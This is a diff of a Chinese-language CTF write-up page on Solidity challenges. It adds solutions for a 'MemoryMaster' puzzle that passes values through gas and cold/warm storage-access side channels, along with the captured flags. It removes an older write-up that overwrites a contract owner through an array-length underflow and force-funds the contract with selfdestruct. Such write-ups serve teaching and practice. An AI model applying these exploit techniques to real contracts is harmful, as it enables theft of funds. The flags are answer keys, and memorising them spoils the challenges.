+<span class="w">        </span><span class="nx">m</span><span class="p">.</span><span class="nx">memorize</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">recall</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h3 id="_3">牛刀小试<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">=</span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="kr">interface</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint16</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">test</span><span class="p">(</span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">uint16</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">memorize_revert</span><span class="p">(</span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">        </span><span class="nx">uint16</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">recall</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize_revert</span><span class="p">(</span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">uint16</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">m</span><span class="p">.</span><span class="nx">memorize</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">revert</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h3 id="_4">终极挑战<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">=</span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="kr">interface</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">test</span><span class="p">(</span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">m</span><span class="p">.</span><span class="nx">memorize</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">recall</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">recalled</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h2 id="_5">解题思路<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>需要编写包含函数 <code>memorize</code> 和函数 <code>recall</code> 的合约 <code>MemoryMaster</code>，合约 <code>Challenge</code> 将首先调用函数 <code>memorize</code> 并传入参数 <code>n</code>，随后调用函数 <code>recall</code> 并期望返回 <code>n</code>。</p>
+<h3 id="_6">记忆练习<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>本题没有对函数 <code>memorize</code> 和函数 <code>recall</code> 进行任何限制，因而可以直接借助状态变量。</p>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_n</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h4 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>flag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_dd0d6977ef}</p>
+</blockquote>
+<h3 id="_7">牛刀小试<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<ul>
+<li>函数 <code>memorize</code> 被调用后即 <code>revert</code>，尽管由于 <code>try/catch</code> 的存在，不影响后续操作，但无法再使用状态变量来传递 <code>n</code> 值</li>
+<li>便想到可以借助 <code>gasleft()</code>，汽油的消耗不受回滚的影响，并且 <code>n</code> 的类型也由 <code>uint256</code> 调整为了 <code>uint16</code>，不过实施起来就没那么简单了 :(</li>
+<li>梳理一下已知的信息<ul>
+<li>交易的初始汽油量受 <code>geth</code> 的 <code>--rpc.gascap</code> 控制，默认为 <span class="arithmatex">\(50000000\)</span><sup id="fnref:gascap"><a class="footnote-ref" href="#fn:gascap">1</a></sup></li>
+<li>每次函数调用会传入剩余汽油的 63/64</li>
+</ul>
+</li>
+<li>若函数 <code>memorize</code> 故意消耗掉 <code>x</code> 汽油，那么传入 <code>recall</code> 的汽油量为 <code>(50000000 - k - x) * 63 / 64</code>。<span class="arithmatex">\(50000000\)</span> 映射到 <span class="arithmatex">\(2^{16}\)</span>，每个区间约 <span class="arithmatex">\(763\)</span> 汽油，考虑到 <code>63/64</code>，可以以 <span class="arithmatex">\(720\)</span> 为一个单位<ul>
+<li><code>gasleft()</code> 包含 <code>GAS</code> 操作码，获取该操作执行结束后剩余的汽油量<sup id="fnref:gas"><a class="footnote-ref" href="#fn:gas">2</a></sup></li>
+</ul>
+</li>
+<li>
+<p>首先可利用 <code>revert</code> 获得执行到函数 <code>recall</code> 的剩余汽油量，并计算出 <code>k</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/utils/Strings.sol&quot;</span><span class="p">;</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">720</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">n</span><span class="p">))</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="nx">revert</span><span class="p">(</span><span class="nx">Strings</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="nx">n</span><span class="p">));</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
 <span class="p">}</span><span class="w"></span>
 </code></pre></div>
 </li>
 <li>
-<p>除此之外，能够调用的函数有 <code>addPost</code>、<code>editPost</code>、<code>removePost</code> 和 <code>nPost</code>。注意到 <code>removePost</code> 中 <code>length</code> 的减法没有使用 <code>SafeMath</code> 或在使用前进行判断</p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">addPost</span><span class="p">(</span><span class="nx">string</span><span class="w"> </span><span class="nx">title</span><span class="p">,</span><span class="w"> </span><span class="nx">string</span><span class="w"> </span><span class="nx">content</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">Post</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">post</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Post</span><span class="p">(</span><span class="nx">title</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_posts</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_authors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">PostPublished</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">_posts</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<p>提交字节码到服务器，由此可大致算出 <code>k = 30040</code> (<code>(50000000 - k - 27688 * 720) * 63 / 64 = 29565309</code>)</p>
+<div class="highlight"><pre><span></span><code>Testing <span class="m">1</span>/10...
+<span class="nv">n</span> <span class="o">=</span> <span class="m">27688</span>
+...
+web3.exceptions.ContractLogicError: execution reverted: <span class="m">29565309</span>
+</code></pre></div>
+</li>
+</ul>
+<h4 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">editPost</span><span class="p">(</span><span class="w"></span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">index</span><span class="p">,</span><span class="w"></span>
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="nx">title</span><span class="p">,</span><span class="w"></span>
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="nx">content</span><span class="w"></span>
-<span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_authors</span><span class="p">[</span><span class="nx">index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_posts</span><span class="p">[</span><span class="nx">index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Post</span><span class="p">(</span><span class="nx">title</span><span class="p">,</span><span class="w"> </span><span class="nx">content</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">PostEdited</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">index</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">720</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">uint256</span><span class="p">(</span><span class="nx">n</span><span class="p">))</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">removePost</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">index</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">int256</span><span class="p">(</span><span class="nx">index</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">int256</span><span class="p">(</span><span class="nx">_posts</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">index</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">_posts</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">            </span><span class="nx">_posts</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_posts</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span><span class="w"></span>
-<span class="w">            </span><span class="nx">_authors</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_authors</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">recall</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">uint16</span><span class="p">((</span><span class="mf">50000000</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">30040</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">64</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">63</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">720</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<h4 id="flag_1">Flag<a class="headerlink" href="#flag_1" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>flag{Gas_gAs_gaS_c4n_b3_us3d_aS_s1de_ChaNNel_5a01148fd5}</p>
+</blockquote>
+<h3 id="_8">终极挑战<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<ul>
+<li>函数 <code>memorize</code> 添加了 <code>view</code> 修饰符，因而不能修改状态变量，而 <code>n</code> 的类型又恢复为 <code>uint256</code>，上一题的策略也不能再使用</li>
+<li>一部分操作码，如 <code>SSTORE</code>、<code>SLOAD</code>，消耗的汽油量与访问的位置是否是初次访问有关，冷访问要消耗更多的汽油</li>
+<li>
+<p>可以通过故意访问一些特定的位置来向 <code>recall</code> 传递 <code>n</code> 的值，可以使用 <code>SLOAD</code>，访问冷/热存储位置的开销分别为 <code>2100</code>/<code>100</code>，或借助于其它 <code>ADDRESS_TOUCHING_OPCODES</code>、<code>STORAGE_TOUCHING_OPCODES</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="mf">0.8.17</span><span class="p">;</span><span class="w"></span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">MemoryMaster</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="nx">access</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">memorize</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint16</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">256</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="nx">n</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">access</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span><span class="w"></span>
 <span class="w">        </span><span class="p">}</span><span class="w"></span>
 <span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_posts</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">_authors</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">PostRemoved</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">index</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
 
-<span class="kd">function</span><span class="w"> </span><span class="nx">nPosts</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_posts</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
-</code></pre></div>
-</li>
-<li>
-<p>因为数组长度可控且可编辑指定下标的数组元素，接下来只需要通过 <code>editPost</code> 覆盖 <code>owner</code> 变量</p>
-<ul>
-<li><code>string</code> 类型的变量存储方式与 <code>address</code> 类型的不同，当长度小于 <span class="arithmatex">\(32\)</span> 字节时，元素存储在高位，低位存储字符串字节长度，当长度大于 <span class="arithmatex">\(31\)</span> 字节时，存储方式与数组类似</li>
-<li>建议通过 <code>_authors</code> 数组完成覆盖操作</li>
-</ul>
-<div class="highlight"><pre><span></span><code><span class="c1">// contract Initializable</span><span class="w"></span>
-<span class="nx">bool</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_initialized</span><span class="p">;</span><span class="w">  </span><span class="c1">// slot 0</span><span class="w"></span>
-<span class="nx">bool</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_initializing</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 0</span><span class="w"></span>
-
-<span class="c1">// contract TotallySecureDapp is Initializable</span><span class="w"></span>
-<span class="nx">struct</span><span class="w"> </span><span class="nx">Post</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="nx">title</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="nx">content</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"> </span><span class="c1">// 2 slots</span><span class="w"></span>
-
-<span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">_contractId</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 1</span><span class="w"></span>
-<span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">_owner</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 2</span><span class="w"></span>
-<span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">_authors</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 3</span><span class="w"></span>
-<span class="nx">Post</span><span class="p">[]</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">_posts</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 4</span><span class="w"></span>
-<span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">_flagCaptured</span><span class="p">;</span><span class="w"> </span><span class="c1">// slot 5</span><span class="w"></span>
-</code></pre></div>
-</li>
-<li>
-<p>另外，合约 <code>TotallySecureDapp</code> 不接受直接转账，所以需要一些特殊手段 &gt;v&lt; 比如 <code>selfdestruct</code></p>
-<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="nx">revert</span><span class="p">(</span><span class="s1">&#39;Contract does not accept payments&#39;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
-</code></pre></div>
-</li>
-<li>
-<p>给 <code>TotallySecureDapp</code> 合约实例转账后，通过 web3py 与合约进行交互</p>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
-<span class="kn">import</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">time</span>
-
-<span class="c1"># 在 https://infura.io/ 注册一个账号并创建一个项目可获得 API key</span>
-<span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="s2">&quot;https://ropsten.infura.io/v3/&lt;api-key&gt;&quot;</span><span class="p">))</span>
-
-<span class="n">account</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="s2">&quot;&lt;your-private-key&gt;&quot;</span><span class="p">)</span>
-
-<span class="n">contract_address</span> <span class="o">=</span> <span class="s2">&quot;&lt;totallysecuredapp-instance-address&gt;&quot;</span>
-
-<span class="n">abi</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;abi.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
